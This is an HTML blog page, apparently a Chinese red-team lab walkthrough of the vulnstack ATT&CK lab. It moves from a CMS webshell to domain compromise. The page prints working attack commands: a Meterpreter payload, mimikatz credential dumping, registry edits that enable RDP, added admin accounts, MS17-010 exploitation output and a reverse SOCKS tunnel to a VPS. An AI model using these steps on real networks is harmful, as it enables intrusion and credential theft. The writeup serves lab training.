@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="ATT&amp;CK实战系列-红队评估(一)" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            ATT&amp;CK实战系列-红队评估(一)
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="post-toc-text">环境搭建</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="post-toc-text">渗透流程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="post-toc-text">外网渗透</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="post-toc-text">内网渗透</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%B8%8A%E7%BA%BFmeterpreter"><span class="post-toc-text">上线meterpreter</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="post-toc-text">横向渗透</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="post-toc-text">代理转发</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E7%99%BB%E5%BD%95192-168-52-141"><span class="post-toc-text">登录192.168.52.141</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="post-toc-text">拿下域控</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E6%80%BB%E7%BB%93"><span class="post-toc-text">总结</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="post-toc-text">参考链接</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载地址:<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p>将三个虚拟机启动起来</p>
+<p>除了windows 7那个主机，其他都只设置成<strong>仅主机</strong>模式</p>
+<p>windows 7添加两个网卡，一个是仅主机，一个是NAT</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251017285.png" title="image-20230225101653967" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251017285.png" alt="image-20230225101653967"></a></p>
+<p>然后在windows7上开启phpstudy，报错就重启</p>
+<h1 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h1><p>目标是拿下域控</p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>在主页发现了后台密码的泄露</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251026655.png" title="image-20230225102605429" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251026655.png" alt="image-20230225102605429"></a></p>
+<p>进入后台后，在修改模板的地方写一句话木马</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251026678.png" title="image-20230225102636607" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251026678.png" alt="image-20230225102636607"></a></p>
+<p>测试一下这个马是否在主页触发</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251032637.png" title="image-20230225103252540" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251032637.png" alt="image-20230225103252540"></a></p>
+<p>然后使用蚁剑连接<code>http://192.168.161.129/yxcms/</code>即可</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain 查看域用户信息</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251035805.png" title="image-20230225103518775" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251035805.png" alt="image-20230225103518775"></a></p>
+<p>发现存在其他用户，而且有krbtgt，所以猜测存在kerberos</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain 查找域控制器</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251101918.png" title="image-20230225110128890" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251101918.png" alt="image-20230225110128890"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping OWA.god.org 定位域控ip</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251124559.png" title="image-20230225112409531" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251124559.png" alt="image-20230225112409531"></a></p>
+<p>得到域控ip为<code>192.168.52.138</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251129539.png" title="image-20230225112941505" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251129539.png" alt="image-20230225112941505"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;3389&quot;  查看是否开启rdp端口</span><br></pre></td></tr></table></figure>
+
+<p>如果没有开启的话，就用以下命令开启</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br></pre></td></tr></table></figure>
+
+<p>然后添加一个用户并加入管理员组</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user v2i <span class="number">123456</span>@qwe /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators v2i /add</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251134401.png" title="image-20230225113414373" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251134401.png" alt="image-20230225113414373"></a></p>
+<p>然后尝试使用rdp登录win7，在kali上使用remmina</p>
+<p>但是发现连接不是，可能是被墙了</p>
+<h3 id="上线meterpreter"><a href="#上线meterpreter" class="headerlink" title="上线meterpreter"></a>上线meterpreter</h3><p>试试上线meterpreter，这里使用bind_tcp</p>
+<p>我不知道为什么reverse_tcp一直上线不了。。。。。cs都能上的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use payload windows/x64/meterpreter_bind_tcp</span><br><span class="line">msf6 payload(windows/x64/meterpreter_bind_tcp) &gt; generate -f exe -o bind.exe</span><br><span class="line">msf6 payload(windows/x64/meterpreter_bind_tcp) &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter_bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter_bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST 192.168.161.129</span><br><span class="line">RHOST =&gt; 192.168.161.129</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>将bind.exe通过蚁剑上传到目标主机，执行这个文件，就可以上线meterpreter</p>
+<p>因为是administrator用户，所以很容易提权到system</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261041402.png" title="image-20230226104129318" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261041402.png" alt="image-20230226104129318"></a></p>
+<p>然后使用<code> run post/windows/manage/enable_rdp</code>来打开rdp服务</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261048946.png" title="image-20230226104856908" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261048946.png" alt="image-20230226104856908"></a></p>
+<p>使用rdesktop连接【不知道为什么remmina连不了】</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261051068.png" title="image-20230226105149934" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261051068.png" alt="image-20230226105149934"></a></p>
+<p>然后上传mimikaz.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /home/kali/Desktop/thm_tmp/mimikatz.exe</span><br><span class="line">[*] uploading  : /home/kali/Desktop/thm_tmp/mimikatz.exe -&gt; mimikatz.exe</span><br><span class="line">[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /home/kali/Desktop/thm_tmp/mimikatz.exe -&gt; mimikatz.exe</span><br><span class="line">[*] uploaded   : /home/kali/Desktop/thm_tmp/mimikatz.exe -&gt; mimikatz.exe</span><br></pre></td></tr></table></figure>
+
+<p>使用shell，执行<code>chcp 65001</code>消除乱码</p>
+<p>在mimikat.exe执行以下命令，来获得管理员的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug <span class="comment">#获取debug特权</span></span><br><span class="line">sekurlsa::logonpasswords full <span class="comment">#导出用户凭证</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261151761.png" title="image-20230226115148716" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261151761.png" alt="image-20230226115148716"></a></p>
+<p>得到域管理员明文密码:<code>hongrisex@2023</code></p>
+<p>继续探察内网存活主机，这里使用icmp来进行探察</p>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>ipconfig后发现内网ip为<code>192.168.52.143</code></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @<span class="built_in">ping</span> -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.%I | <span class="built_in">findstr</span> &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是不太理想，所以就上传fscan进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">[+] 192.168.52.141      MS17-010        (Windows Server 2003 3790)</span><br><span class="line">[*] NetBios: 192.168.52.138  [+]DC owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1 </span><br><span class="line">[+] 192.168.52.138      MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor</span><br><span class="line">[*] WebTitle: http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel</span><br><span class="line">[+] ftp://192.168.52.141:21:anonymous </span><br><span class="line">[*] WebTitle: http://192.168.52.143     code:200 len:14749  title:phpStudy 探针 2014</span><br></pre></td></tr></table></figure>
+
+<p>发现另外两个内网主机</p>
+<p><code>192.168.52.141</code>,<code>192.168.52.138</code></p>
+<p>且<code>192.168.52.141</code>存在ms17-010</p>
+<p>因为在内网，所以使用meterpreter设置一下路由转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to 192.168.52.0/255.255.255.0...</span><br><span class="line">[+] Added route to 192.168.52.0/255.255.255.0 via 192.168.161.129</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 1</span><br></pre></td></tr></table></figure>
+
+<p>然后使用<code>auxiliary/admin/smb/ms17_010_command </code>模块进行命令执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; <span class="built_in">set</span> RHOSTS 192.168.52.141</span><br><span class="line">RHOSTS =&gt; 192.168.52.141</span><br><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; <span class="built_in">set</span> <span class="built_in">command</span> <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">command</span> =&gt; <span class="built_in">whoami</span></span><br><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790</span><br><span class="line">[*] 192.168.52.141:445    - Filling barrel with fish... <span class="keyword">done</span></span><br><span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.52.141:445    -     [*] Preparing dynamite...</span><br><span class="line">[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss</span><br><span class="line">[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!</span><br><span class="line">[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!</span><br><span class="line">[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel</span><br><span class="line">[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x8ccbe370</span><br><span class="line">[*] 192.168.52.141:445    - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[+] 192.168.52.141:445    - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] 192.168.52.141:445    - Getting the <span class="built_in">command</span> output...</span><br><span class="line">[*] 192.168.52.141:445    - Executing cleanup...</span><br><span class="line">[+] 192.168.52.141:445    - Cleanup was successful</span><br><span class="line">[+] 192.168.52.141:445    - Command completed successfully!</span><br><span class="line">[*] 192.168.52.141:445    - Output <span class="keyword">for</span> <span class="string">&quot;whoami&quot;</span>:</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>然后可以添加账户，进行连接，但是我觉得没有必要，因为我们已经有了域管理员的密码，所以可以直接远程登录</p>
+<p>但是需要开启rdp服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261330991.png" title="image-20230226133024935" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261330991.png" alt="image-20230226133024935"></a></p>
+<p>接下来就需要使用代理转发，来登录远程桌面了</p>
+<h4 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h4><p>因为目标机器存在内网，无法直接连接，所以要进行代理转发</p>
+<p>这里使用<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">ew</a></p>
+<p>vps上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64  -s rcsocks -l 9998 -e 9999</span><br></pre></td></tr></table></figure>
+
+<p>已控内网主机上</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win_32.exe -s rssocks -d vpsip -e <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p>kali <code>etc/proxychains4.conf</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261353235.png" title="image-20230226135348176" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261353235.png" alt="image-20230226135348176"></a></p>
+<p>就相当于是vps监听9998，并把流量发送给9999端口，然后已控内网主机接受vps的9999端口的流量</p>
+<h4 id="登录192-168-52-141"><a href="#登录192-168-52-141" class="headerlink" title="登录192.168.52.141"></a>登录192.168.52.141</h4><p>kali上执行以下命令，查看3389端口是否开启</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -p 3389 192.168.52.143 -sT -Pn <span class="comment">#socks协议不支持icmp，所以使用-Pn禁用ping</span></span><br></pre></td></tr></table></figure>
+
+<p>然后登录远程桌面，用上面得到的域管理员密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop   192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261356380.png" title="image-20230226135650315" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261356380.png" alt="image-20230226135650315"></a></p>
+<p>登录了之后，就可以收集一些命令和添加一个用户</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#添加用户并加入本地管理员组</span><br><span class="line"><span class="built_in">net</span> user &lt;username&gt; &lt;password&gt; /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators &lt;username&gt; /add</span><br></pre></td></tr></table></figure>
+
+<h4 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h4><p>域控的ip为192.168.52.138</p>
+<p>查看他的3389端口是否开启，去用rdp远程登录</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261509639.png" title="image-20230226150945594" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261509639.png" alt="image-20230226150945594"></a></p>
+<p>可惜是关着的</p>
+<p>但是发现445端口是开着的，而且通过fscan扫描是存在ms17-010的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261512568.png" title="image-20230226151256514" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302261512568.png" alt="image-20230226151256514"></a></p>
